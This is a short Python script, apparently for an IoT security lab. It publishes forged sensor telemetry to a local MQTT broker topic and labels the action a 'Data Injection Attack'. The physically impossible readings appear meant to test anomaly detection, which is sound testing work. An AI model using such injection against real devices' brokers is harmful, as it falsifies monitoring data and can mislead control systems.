import paho.mqtt.client as mqtt
import json

BROKER = "localhost"
TOPIC = "device_1/telemetry"

client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
client.connect(BROKER, 1883)

print("💉 Starting Data Injection Attack...")

# Valor físicamente imposible para un DHT22
fake_data = {
    "temperature": 150.0, 
    "humidity": 5.0,
    "seq": 999,
    "state": 8  # Hot/Humid (mapeo forzado)
}

client.publish(TOPIC, json.dumps(fake_data))
print(f"Sent malicious payload: {fake_data}")
client.disconnect()